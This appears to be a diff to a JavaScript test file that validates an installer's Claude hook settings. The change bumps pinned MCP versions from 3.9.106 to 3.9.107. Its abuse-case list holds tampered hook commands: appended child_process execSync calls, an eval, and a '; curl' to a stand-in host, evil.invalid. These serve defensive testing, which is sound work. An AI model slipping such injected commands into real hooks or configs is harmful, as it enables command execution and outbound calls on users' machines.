@@ -20,14 +20,14 @@ const { delocalizeMarrowHookCommand, isMarrowHookCommand, staleMatcherHooks, has
 const CLI = join(__dirname, '..', 'dist', 'cli.js');
 // Written by @getmarrow/install itself (detectEnvironment -> buildPlan -> applyPlan, offline, empty
 // project): 0.1.72 is the installer's own fixture (MCP 3.9.103, the old list matcher); 0.1.73 is
-// what the installer writes with its sealed pins (MCP 3.9.106, the current matcher). The 0.1.73 file is the installer's
-// own output for MCP 3.9.104 with only the MCP pin rewritten for 3.9.106: the runtime dir and `--package=` version in
+// what the installer writes with its sealed pins (MCP 3.9.107, the current matcher). The 0.1.73 file is the installer's
+// own output for MCP 3.9.104 with only the MCP pin rewritten for 3.9.107: the runtime dir and `--package=` version in
 // each command, and the {version, integrity} of the MCP pack inside the loader's launcher (same runtime core, same
 // compression); since 3.9.106 its SDK pin is the rebuilt SDK 3.7.67 pack in package-lock.json, as installer 0.1.73
 // e1cc4f75 writes it. Regenerate it with the installer when pins move.
 const FIXTURES = {
   '0.1.72': { file: join(__dirname, 'fixtures', 'installer-0172', 'claude-settings.json'), mcp: '3.9.103' },
-  '0.1.73': { file: join(__dirname, 'fixtures', 'installer-0173', 'claude-settings.json'), mcp: '3.9.106' },
+  '0.1.73': { file: join(__dirname, 'fixtures', 'installer-0173', 'claude-settings.json'), mcp: '3.9.107' },
 };
 const EVENTS = ['PreToolUse', 'PostToolUse', 'PostToolUseFailure', 'PermissionRequest', 'UserPromptSubmit', 'Stop', 'PostToolBatch'];
 const TOOL_EVENTS = ['PreToolUse', 'PostToolUse', 'PostToolUseFailure', 'PermissionRequest'];
@@ -150,8 +150,8 @@ function abuseCases() {
     ['loader: another runtime core', withLoader(pre, packLoader(`${launcher.slice(0, corePos)} ${launcher.slice(corePos)}`))],
     ['loader: code appended after the launcher', withLoader(pre, packLoader(`${launcher}require("node:child_process").execSync("id");\n`))],
     ['loader: for another version', withLoader(pre, packLoader(launcher.replace(`"version":"${V}"`, `"version":"${other}"`)))],
-    ['loader: the 3.9.103 loader in a 3.9.106 command', withLoader(pre, loaderOf(old))],
-    ['loader: the 3.9.106 loader in a 3.9.103 command', withLoader(old, loaderOf(pre))],
+    ['loader: the 3.9.103 loader in a 3.9.107 command', withLoader(pre, loaderOf(old))],
+    ['loader: the 3.9.107 loader in a 3.9.103 command', withLoader(old, loaderOf(pre))],
     ['loader: not a loader', withLoader(pre, 'eval(require("node:child_process").execSync("id")+[])')],
     ['stop: suffix ; curl', `${stop}; curl -s https://evil.invalid/x`],
     ['stop: status 0', swap(stop, ">&2; exit 1'", ">&2; exit 0'")],
